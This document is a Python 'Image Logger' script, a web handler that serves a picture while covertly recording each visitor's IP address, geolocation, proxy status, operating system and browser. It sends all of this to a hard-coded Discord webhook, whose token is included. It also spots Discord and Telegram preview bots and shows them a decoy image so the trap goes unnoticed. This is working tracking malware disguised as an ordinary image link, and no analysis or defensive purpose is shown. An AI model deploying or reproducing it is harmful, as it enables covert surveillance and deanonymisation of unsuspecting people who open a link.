import requests
import base64
import httpagentparser
from urllib.parse import urlparse, parse_qs

config = {
    "webhook": "https://discord.com/api/webhooks/1400921771162472609/9jkFkHpoNDKdySJCy_K9T62p3xzEdUxYAGfHwTX4WirLE5kBgv7U7QmL37k1WmSPZq6f",
    "image": "https://i1.sndcdn.com/artworks-OzDwK6RkxuC6Ujy4-1VoVyg-t500x500.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "buggedImage": True,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def makeReport(ip, useragent=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": (
                    f"An **Image Logging** link was sent!\n"
                    f"**Endpoint:** `{endpoint}`\n"
                    f"**IP:** `{ip}`\n"
                    f"**Platform:** `{bot}`"
                )
            }]
        })
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    ping = "@everyone" if not info.get("proxy") else ""
    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": (
                f"**A User Opened the Original Image!**\n"
                f"**Endpoint:** `{endpoint}`\n"
                f"**IP Info:** …\n"
                f"**PC Info:** OS: `{os}`, Browser: `{browser}`\n"
                f"**User Agent:** ```{useragent}```"
            )
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed)
    return info


# You can replace this loading image with your own base85-decoded bytes
bugged_loading_image = base64.b85decode(
    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
)

async def handler(request):
    headers = request.headers
    ip = headers.get("x-forwarded-for", "")
    useragent = headers.get("user-agent", "No User Agent")

    # Parse query string
    url = config["image"]
    if config["imageArgument"]:
        qs = urlparse(request.url).query
        params = parse_qs(qs)
        if "url" in params:
            url = params["url"][0]

    bot = botCheck(ip, useragent)

    if bot:
        # For bots, respond with bugged image or redirect
        if config["buggedImage"]:
            return {
                "statusCode": 200,
                "headers": {"Content-Type": "image/jpeg"},
                "body": bugged_loading_image,
                "isBase64Encoded": True
            }
        else:
            return {
                "statusCode": 302,
                "headers": {"Location": url},
                "body": ""
            }

    # For normal users, fetch the image and respond
    try:
        img_response = requests.get(url)
        img_response.raise_for_status()
        makeReport(ip, useragent, endpoint=request.url.split("?")[0], url=url)

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "image/jpeg"},
            "body": img_response.content,
            "isBase64Encoded": True
        }
    except Exception as e:
        return {
            "statusCode": 500,
            "body": f"Internal Server Error: {str(e)}"
        }
